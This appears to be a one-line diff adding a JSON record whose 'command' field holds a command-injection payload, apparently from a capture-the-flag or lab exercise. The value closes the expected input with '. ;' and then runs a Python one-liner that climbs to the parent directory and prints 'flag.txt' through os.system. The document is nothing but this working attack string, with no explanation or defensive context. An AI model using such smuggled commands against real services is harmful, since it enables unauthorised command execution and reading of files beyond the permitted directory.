@@ -1,0 +1,1 @@
+{"command": ". ; python -c 'import os;x=os.path.normpath(os.getcwd() + os.sep + os.pardir);os.chdir(x);os.system(\"cat flag.txt\")'"}
